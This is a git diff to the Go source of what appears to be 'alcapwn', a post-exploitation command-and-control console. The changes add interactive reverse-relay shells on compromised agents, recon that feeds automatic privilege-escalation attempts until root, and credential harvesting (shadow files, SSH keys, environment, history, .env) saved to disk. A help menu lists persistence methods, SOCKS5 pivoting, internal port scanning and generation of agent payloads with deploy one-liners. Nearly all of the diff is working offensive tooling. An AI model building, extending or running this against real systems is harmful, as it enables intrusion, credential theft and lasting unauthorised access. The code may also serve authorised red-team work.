@@ -12,6 +12,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"alcapwn/proto"
 )
 
 // fmtAge formats a duration as a short human-readable string.
@@ -467,6 +469,15 @@ func (c *Console) cmdKill(args []string) {
 		plain.Close()
 	}
 
+	// Close any active pivot listeners for this session.
+	sess.mu.Lock()
+	ps := sess.pivotState
+	sess.pivotState = nil
+	sess.mu.Unlock()
+	if ps != nil {
+		ps.Close()
+	}
+
 	c.registry.Remove(id)
 	fmt.Printf("[*] Session %d terminated.\n", id)
 }
@@ -495,6 +506,7 @@ func (c *Console) cmdInfo(args []string) {
 	rootLevel := sess.RootLevel
 	agentMeta := sess.AgentMeta
 	isAgent := sess.IsAgent
+	ps := sess.pivotState
 	sess.mu.Unlock()
 
 	// Agent sessions: display metadata from the Hello handshake.
@@ -516,6 +528,12 @@ func (c *Console) cmdInfo(args []string) {
 			fmt.Printf("  %-14s %s\n", "Shell:", safeFindings(agentMeta.Shell))
 		} else {
 			fmt.Printf("  %-14s %s\n", "Shell:", "(built-in minishell)")
+		}
+		if ps != nil && len(ps.fwdListeners) > 0 {
+			fmt.Println("\n[ACTIVE PIVOTS]")
+			for port := range ps.fwdListeners {
+				fmt.Printf("  127.0.0.1:%d\n", port)
+			}
 		}
 		if creds != nil && *creds != "" {
 			fmt.Println("\n[HARVESTED CREDENTIALS]")
@@ -767,6 +785,79 @@ func stripDangerousAnsi(s string) string {
 		i++
 	}
 	return result.String()
+}
+
+// cmdShell opens an interactive shell on an agent session via the relay
+// mechanism.  The agent starts its system shell and pipes stdio through a
+// dedicated TCP relay connection so the operator gets a raw interactive shell
+// without multiplexing through the encrypted task channel.
+//
+// Usage: shell <id>
+func (c *Console) cmdShell(args []string) {
+	if len(args) < 1 {
+		fmt.Println("Usage: shell <id>")
+		return
+	}
+	id, err := strconv.Atoi(args[0])
+	if err != nil {
+		fmt.Printf("[!] Invalid session ID: %s\n", args[0])
+		return
+	}
+	sess := c.registry.Get(id)
+	if sess == nil {
+		fmt.Printf("[!] Session %d not found\n", id)
+		return
+	}
+	if !sess.IsAgent {
+		fmt.Printf("[!] Session %d is not an agent — use 'use %d' for PTY sessions\n", id, id)
+		return
+	}
+
+	relayLn, relayAddr, err := c.openRelayListener(sess)
+	if err != nil {
+		fmt.Printf("[!] shell: %v\n", err)
+		return
+	}
+
+	// Dispatch TaskShell; the agent will dial relayAddr and exec its shell.
+	// This blocks until the shell exits, so run it in a goroutine.
+	shellDone := make(chan error, 1)
+	go func() {
+		res, dispErr := agentDispatch(sess, proto.Task{
+			ID:    agentTaskID("sh", relayAddr),
+			Kind:  proto.TaskShell,
+			Relay: relayAddr,
+		}, 60*time.Minute)
+		if dispErr != nil {
+			shellDone <- dispErr
+		} else if res.Error != "" {
+			shellDone <- fmt.Errorf("%s", res.Error)
+		} else {
+			shellDone <- nil
+		}
+	}()
+
+	// Accept agent's relay-back connection (30 s window).
+	relayLn.(*net.TCPListener).SetDeadline(time.Now().Add(30 * time.Second))
+	relayConn, err := relayLn.Accept()
+	relayLn.Close()
+	if err != nil {
+		fmt.Printf("[!] shell: agent did not connect back: %v\n", err)
+		return
+	}
+
+	// Enter raw interactive I/O.  shellInteract blocks until the shell exits.
+	c.shellInteract(id, relayConn)
+	relayConn.Close()
+
+	// Wait briefly for the agent's TaskShell result so error is surfaced.
+	select {
+	case shErr := <-shellDone:
+		if shErr != nil {
+			fmt.Printf("[!] shell: %v\n", shErr)
+		}
+	case <-time.After(3 * time.Second):
+	}
 }
 
 // cmdPs lists processes on a backgrounded session.
@@ -1626,6 +1717,16 @@ func (c *Console) cmdCreds(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+	isAgent := sess.IsAgent
+	sess.mu.Unlock()
+
+	// Agent sessions: use TaskCreds (pure Go file reads, no PTY required).
+	if isAgent {
+		c.cmdCredsAgent(sess, outPath)
+		return
+	}
+
+	sess.mu.Lock()
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
@@ -1748,6 +1849,14 @@ func (c *Console) cmdRecon(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+
+	// Handle agent sessions (non-PTY)
+	if sess.IsAgent {
+		sess.mu.Unlock()
+		c.cmdReconAgent(sess)
+		return
+	}
+
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
@@ -1802,7 +1911,211 @@ func (c *Console) cmdRecon(args []string) {
 		c.startDrain(sess, conn)
 	}
 
-	fmt.Printf("[+] Recon complete for session %d — use 'info %d' to view results.\n", id, id)
+	printMatchSummary(matches, id)
+	fmt.Printf("[+] Recon complete for session %d.\n", id)
+}
+
+// cmdReconAgent runs OS-specific recon on an agent session and stores findings.
+func (c *Console) cmdReconAgent(sess *Session) {
+	if !sess.IsAgent {
+		fmt.Printf("[!] Session %d is not an agent session\n", sess.ID)
+		return
+	}
+
+	sess.mu.Lock()
+	isWindows := sess.AgentMeta != nil && sess.AgentMeta.OS == "windows"
+	agentShell := ""
+	if sess.AgentMeta != nil {
+		agentShell = sess.AgentMeta.Shell
+	}
+	sess.mu.Unlock()
+
+	if !isWindows && strings.Contains(agentShell, "bash") {
+		// Linux + bash available: run the full structured recon script.
+		c.cmdReconAgentLinux(sess)
+		return
+	}
+
+	// Windows or no bash: use TaskRecon (structured JSON for Windows, basic text for others).
+	fmt.Printf("[*] Running recon on agent %d...\n", sess.ID)
+
+	res, err := agentDispatch(sess, proto.Task{
+		ID:   agentTaskID("recon", ""),
+		Kind: proto.TaskRecon,
+	}, 60*time.Second)
+	if err != nil {
+		fmt.Printf("[!] Recon failed: %v\n", err)
+		return
+	}
+	if res.Error != "" {
+		fmt.Printf("[!] Recon error: %s\n", res.Error)
+		return
+	}
+
+	if isWindows {
+		var wr struct {
+			Hostname    string   `json:"hostname"`
+			User        string   `json:"user"`
+			Domain      string   `json:"domain"`
+			IsAdmin     bool     `json:"is_admin"`
+			OSVersion   string   `json:"os_version"`
+			Arch        string   `json:"arch"`
+			Privileges  []string `json:"privileges"`
+			Admins      []string `json:"admins"`
+			Services    []string `json:"services"`
+			Registry    []string `json:"registry_checks"`
+			NetworkPorts []string `json:"network_ports"`
+		}
+		if err := json.Unmarshal(res.Output, &wr); err != nil {
+			fmt.Printf("[!] Failed to parse Windows recon: %v\n", err)
+			return
+		}
+
+		// Display summary.
+		hostname := safeFindings(wr.Hostname)
+		user := safeFindings(wr.User)
+		domain := safeFindings(wr.Domain)
+		fmt.Printf("[+] Host:       %s\n", hostname)
+		fmt.Printf("[+] User:       %s\\%s\n", domain, user)
+		fmt.Printf("[+] OS:         %s (%s)\n", safeFindings(wr.OSVersion), wr.Arch)
+		if wr.IsAdmin {
+			fmt.Printf("[!] ADMIN:      YES — user is in Administrators group\n")
+		}
+		if len(wr.Privileges) > 0 {
+			fmt.Printf("[+] Privileges: %d token privileges found\n", len(wr.Privileges))
+			for _, p := range wr.Privileges {
+				fmt.Printf("    %s\n", safeFindings(p))
+			}
+		}
+		if len(wr.Registry) > 0 {
+			fmt.Printf("[+] Registry:   %d checks flagged\n", len(wr.Registry))
+			for _, r := range wr.Registry {
+				fmt.Printf("    %s\n", safeFindings(r))
+			}
+		}
+		if len(wr.Admins) > 0 {
+			fmt.Printf("[+] Local admins: %s\n", strings.Join(wr.Admins, ", "))
+		}
+
+		// Detect AlwaysInstallElevated from registry checks.
+		aie := false
+		for _, r := range wr.Registry {
+			if strings.Contains(strings.ToLower(r), "alwaysinstallelevated") {
+				aie = true
+				break
+			}
+		}
+
+		// Populate Findings and run matcher.
+		osStr := wr.OSVersion
+		userStr := wr.User
+		hostStr := wr.Hostname
+		findings := &Findings{
+			Hostname:                 &hostStr,
+			User:                    &userStr,
+			OS:                      &osStr,
+			WinPrivileges:           wr.Privileges,
+			WinIsAdmin:              wr.IsAdmin,
+			WinAlwaysInstallElevated: aie,
+			WinDomain:               wr.Domain,
+		}
+		matches := matchFindings(findings)
+
+		sess.mu.Lock()
+		sess.Findings = findings
+		sess.Matches = matches
+		sess.mu.Unlock()
+
+		printMatchSummary(matches, sess.ID)
+	} else {
+		// Linux/Unix: plain text output (basic info, no structured matching yet).
+		fmt.Printf("%s\n", string(res.Output))
+	}
+
+	fmt.Printf("[+] Recon complete for agent %d.\n", sess.ID)
+}
+
+// cmdReconAgentLinux runs the full bash recon script on a Linux agent session
+// via TaskExec and feeds the output through the standard section parser + matcher.
+// This produces identical Findings/Matches to a PTY recon, enabling exploit auto.
+func (c *Console) cmdReconAgentLinux(sess *Session) {
+	fmt.Printf("[*] Running full bash recon on agent %d (this takes ~30–60s)...\n", sess.ID)
+
+	// Build a nonce-tagged script so section boundaries are tamper-resistant.
+	nonce := makeReconNonce()
+	script := buildReconScript(nonce)
+	sectionRe := buildSectionRe(nonce)
+
+	res, err := agentDispatch(sess, proto.Task{
+		ID:      agentTaskID("recon", "linux"),
+		Kind:    proto.TaskExec,
+		Command: script,
+	}, 3*time.Minute)
+	if err != nil {
+		fmt.Printf("[!] Recon failed: %v\n", err)
+		return
+	}
+	if res.Error != "" {
+		fmt.Printf("[!] Recon error: %s\n", res.Error)
+		return
+	}
+
+	// Clean output (no PTY noise — no PS2 prompts, no shell prompts).
+	raw := stripANSI(string(res.Output))
+	raw = strings.ReplaceAll(raw, "\r", "")
+
+	sections := extractAllSections(raw, sectionRe)
+	if len(sections) == 0 {
+		fmt.Printf("[!] No sections parsed — bash may not have run the script. Raw output:\n%s\n",
+			stripDangerousAnsi(raw[:min(len(raw), 500)]))
+		return
+	}
+
+	findings := (&ReconParser{}).Parse(sections)
+	matches := matchFindings(findings)
+
+	sess.mu.Lock()
+	sess.Findings = findings
+	sess.Matches = matches
+	sess.mu.Unlock()
+
+	printMatchSummary(matches, sess.ID)
+	fmt.Printf("[+] Recon complete for agent %d.\n", sess.ID)
+}
+
+// cmdCredsAgent harvests credentials from an agent session using TaskCreds.
+func (c *Console) cmdCredsAgent(sess *Session, outPath string) {
+	fmt.Printf("[*] Harvesting credentials from agent %d...\n", sess.ID)
+
+	res, err := agentDispatch(sess, proto.Task{
+		ID:   agentTaskID("creds", ""),
+		Kind: proto.TaskCreds,
+	}, 60*time.Second)
+	if err != nil {
+		fmt.Printf("[!] Creds harvest failed: %v\n", err)
+		return
+	}
+	if res.Error != "" {
+		fmt.Printf("[!] Creds harvest error: %s\n", res.Error)
+		return
+	}
+
+	output := string(res.Output)
+	fmt.Println(stripDangerousAnsi(output))
+
+	// Store in session for 'info' display.
+	sess.mu.Lock()
+	sess.HarvestedCreds = &output
+	sess.mu.Unlock()
+
+	// Optionally save to file.
+	if outPath != "" {
+		if err := os.WriteFile(outPath, res.Output, 0600); err != nil {
+			fmt.Printf("[!] Failed to write output to %s: %v\n", outPath, err)
+		} else {
+			fmt.Printf("[+] Saved to %s\n", outPath)
+		}
+	}
 }
 
 func (c *Console) cmdBroadcast(args []string) {
@@ -2229,58 +2542,69 @@ func (c *Console) cmdFingerprint(args []string) {
 }
 
 func (c *Console) cmdHelp() {
-	fmt.Println(`
-  LISTENERS
-    listen <host:port>       Start a new TCP listener
-    listeners                List active listeners
-    unlisten <port|addr>     Stop a listener
+	fmt.Print(`
+  SETUP
+    listen <host:port>                   Start a listener
+    listeners                            List active listeners
+    unlisten <port|addr>                 Stop a listener
+    generate list                        List supported build targets
+    generate <os> <arch> --lhost X       Cross-compile agent binary
+    generate oneliner <os> <arch>        Print shell/PS1 deploy one-liner
 
   SESSIONS
-    sessions                 List all active sessions
-    use <id>                 Attach to a session interactively (Ctrl+D to background)
-    kill <id>                Terminate a session
-    rename <id> <name>       Label a session (letters, digits, - _ . only)
-    tls <id>                 Upgrade a plain session to TLS encryption
-    fp [id]                  Show TLS certificate fingerprint (optionally confirm session)
-    reset <id>               Spawn a new shell from session, close the old one
-    recon <id>               Run automated recon on a session manually
-    info <id>                Print full recon summary for a session
-    exec <id> <cmd>          Run a single command without triggering full recon
-    creds <id> [path]        Harvest credentials (shadow, SSH keys, env, history, .env)
-    ps <id>                  List running processes
-    killproc <id> <pid>      Kill a specific process
-    download <id> <path>     Download file from remote session
-    upload <id> <path>       Upload file to remote session
-    persist create <name> <method>  Create a persistence profile
-    persist <id> <method>           Install persistence on session
-    persist list                    List all persistence profiles
-    persist list <id>               List persistence for a session
-    persist remove <profile_id>     Remove a persistence profile
-    persist assign <pid> <id>       Assign profile to session
-    persist unassign <pid> <id>     Remove session from profile
-    labels <id> [labels...]         Add/view labels on a session
-    notes <id> [text...]            Add/view notes on a session
-    config <set|show|reset>         Manage application configuration
-    export <id|all> [--format json|txt] [path]  Save findings to disk
-    creds <id>                      Harvest credentials from session
-    firewall create <name>          Create a named firewall
-    firewall list                   List all firewalls
-    firewall delete <name>          Delete a firewall
-    firewall rule <name> <ip>       Add firewall rule
-    firewall rules <name>           List rules for firewall
-    firewall clear <name>           Clear all rules
-    firewall assign <name> <addr>   Assign firewall to listener
-    exploit list <id>               Show ranked matches with templated commands filled in
-    exploit <id> [index]            Execute a specific match (default: top-ranked)
-    exploit auto <id>               Try all non-interactive matches until root achieved
-    broadcast <cmd>                 Send a command to all active sessions
+    sessions [filter]                    List sessions (filter: id, ip, os, label)
+    use <id>                             Attach interactively — Ctrl+D to background
+    kill <id>                            Terminate session
+    rename <id> <name>                   Label a session
+    info <id>                            Full recon/findings summary
+    broadcast <cmd>                      Run command on all active sessions
+    export <id|all> [--format json|txt]  Save findings to disk
 
-  PAYLOAD
-    generate list                   List supported build targets
-    generate <os> <arch> --lhost X  Cross-compile agent for target (requires Go toolchain)
-    generate oneliner <os> <arch>   Print shell/PS1 one-liner for deploy
+  RECON & EXPLOITATION
+    recon <id>                           Run recon; auto-prints top matches on finish
+    exploit list <id>                    Show ranked privesc matches, commands filled in
+    exploit <id> [idx]                   Execute match (default: top-ranked)
+    exploit auto <id>                    Walk all non-interactive matches until root
 
-  OPERATOR
-    help                            Show this message
-    exit                            Exit alcapwn (prompts if sessions are active)`)
+  EXECUTION
+    exec <id> <cmd>                      Run a single command
+    shell <id>                           Interactive shell — Ctrl+D to close  [agent]
+    ps <id>                              List running processes
+    killproc <id> <pid>                  Kill a process by PID
+    download <id> <remote-path>          Download file from session
+    upload <id> <remote-path>            Upload file to session
+    creds <id> [path]                    Harvest creds: shadow, SSH, env, history, .env
+
+  PERSISTENCE
+    persist <id> <method>                Install persistence on session
+    persist create <name> <method>       Create a named persistence profile
+    persist list [id]                    List profiles / session assignments
+    persist assign <pid> <id>            Assign profile to session
+    persist unassign <pid> <id>          Remove session from profile
+    persist remove <pid>                 Delete a profile
+
+    Linux PTY methods:  cron  bashrc  sshkey  systemd  setuid
+    Windows agent:      reg   schtask
+
+  PIVOTING                                                        [agent only]
+    pivot <id> --socks5 <port>           SOCKS5 proxy on 127.0.0.1:port
+    pivot <id> --fwd <lp>:<host>:<port>  TCP forward localhost:lp → host:port
+    scan <id> <cidr|ip> [--ports ...] [--timeout ms]
+                                         TCP-connect port scan from agent
+
+  SECURITY
+    tls <id>                             Upgrade session to TLS
+    fp [id]                              Show / verify TLS certificate fingerprint
+    reset <id>                           Respawn shell, close old connection
+    firewall create/list/delete <name>
+    firewall rule/rules/clear <name> [ip]
+    firewall assign <name> <addr>
+
+  MISC
+    labels <id> [labels...]              Tag / view session labels
+    notes <id> [text...]                 Annotate / view session notes
+    config set|show|reset                Application configuration
+    help                                 This message
+    exit                                 Exit (prompts if sessions are active)
+`)
 }
